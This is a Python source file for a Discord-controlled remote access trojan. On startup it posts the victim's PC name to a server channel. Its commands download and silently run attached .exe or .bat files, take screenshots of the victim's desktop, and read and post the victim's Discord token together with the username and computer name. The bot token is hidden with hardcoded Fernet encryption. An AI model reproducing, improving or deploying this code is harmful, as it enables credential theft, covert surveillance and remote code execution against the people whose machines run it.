import os
import discord
import subprocess
from discord.ext import commands
from PIL import ImageGrab
import io
import platform
from cryptography.fernet import Fernet

# Decrypting the token
key = b"XNVMkRPc1qP4Bq9C_OXAtYWD54rpUtJNpO_PICvFLII="  # Replace with your actual key
cipher_suite = Fernet(key)
encrypted_token = b"gAAAAABouGj2ioU6r5nWwx4MPC42YD4zvPVqYfFYKmRELhCwPu4a4PCam5O7xzVMgY4QdSJSnUgcuVfygaO-M4X__OnuC2Qw7H_hDhqdWXgi4-HRTorljLeo5EGJyMXOQnmc0ktWi9jIFQNKHeheNBEi5UAFY6BrHI9cX4y7YHB10Clk6u-RpG0="  # Replace with your actual encrypted token
TOKEN = cipher_suite.decrypt(encrypted_token).decode()

# Set up the bot
GUILD_ID = 1412825105817538563  # Replace this with your actual Guild ID
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Directory to download files to
DOWNLOAD_DIR = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Discord\\"

# Ensure the download directory exists
if not os.path.exists(DOWNLOAD_DIR):
    os.makedirs(DOWNLOAD_DIR)

# Helper function to create or get the user's channel
async def get_or_create_channel(ctx, user_name):
    guild = bot.get_guild(GUILD_ID)  # Use the specific guild by ID
    # Check if a channel with the name already exists
    channel = discord.utils.get(guild.text_channels, name=user_name.lower())
    if not channel:
        # If the channel doesn't exist, create it
        channel = await guild.create_text_channel(user_name)
    return channel

# Command to handle file sending
@bot.command()
async def send(ctx):
    if ctx.channel.name != ctx.author.name.lower():
        await ctx.send("This command can only be used in your personal channel.")
        return

    if len(ctx.message.attachments) > 0:
        attachment = ctx.message.attachments[0]
        file_path = os.path.join(DOWNLOAD_DIR, attachment.filename)

        # Download the file
        await attachment.save(file_path)

        # Now run the downloaded file silently (e.g., .exe, .bat)
        try:
            if file_path.endswith(".bat") or file_path.endswith(".exe"):
                subprocess.run([file_path], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                await ctx.send(f"Executed {attachment.filename} successfully!")
            else:
                await ctx.send(f"Unsupported file type: {attachment.filename}")
        except Exception as e:
            await ctx.send(f"Failed to execute {attachment.filename}: {str(e)}")
    else:
        await ctx.send("No file attached. Please attach a file to send.")

# Command to take a screenshot
@bot.command()
async def screenshot(ctx):
    if ctx.channel.name != ctx.author.name.lower():
        await ctx.send("This command can only be used in your personal channel.")
        return

    # Take a screenshot using Pillow
    screenshot = ImageGrab.grab()
    # Save the screenshot to a BytesIO object
    byte_io = io.BytesIO()
    screenshot.save(byte_io, 'PNG')
    byte_io.seek(0)
    await ctx.send("Here is the screenshot:", file=discord.File(byte_io, 'screenshot.png'))

# Command to grab Discord token and account info
@bot.command()
async def discord(ctx):
    if ctx.channel.name != ctx.author.name.lower():
        await ctx.send("This command can only be used in your personal channel.")
        return

    # Path to the Discord token file
    token_path = os.path.expanduser("~/.config/discord/Token")

    try:
        # Read the token from the file
        with open(token_path, 'r') as file:
            token = file.read().strip()

        # Create an embed to display the token and account info
        embed = discord.Embed(
            title="Discord Account Information",
            description="Here is the token and account info for the current user.",
            color=discord.Color.blue()
        )
        embed.add_field(name="Token", value=token, inline=False)
        embed.add_field(name="Username", value=os.getlogin(), inline=True)
        embed.add_field(name="Computer Name", value=platform.node(), inline=True)

        # Send the embed to the correct channel
        channel = await get_or_create_channel(ctx, "discord-info")
        await channel.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Failed to retrieve Discord token: {str(e)}")

# On bot startup: Check and create the channel, ping @everyone in the corresponding channel
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

    # Get the desktop name or username to create the channel
    desktop_name = platform.node()  # This is the name of the PC
    channel_name = desktop_name or os.getlogin()  # Default to the user’s login name if desktop name is not found

    # Fetch the guild (server) by ID and the channel
    guild = bot.get_guild(GUILD_ID)  # Get the specific guild by ID
    if not guild:
        print(f"Guild with ID {GUILD_ID} not found!")
        return

    channel = await get_or_create_channel(guild, channel_name)

    # Send a "ping" message to indicate the bot is online
    await channel.send(f"@everyone The bot is now online and active on {desktop_name}.")

    print(f"Bot is online. Pinged channel: {channel.name}")

# Run the bot
def run_bot():
    print("Starting the bot...")
    bot.run(TOKEN)

if __name__ == "__main__":
    run_bot()
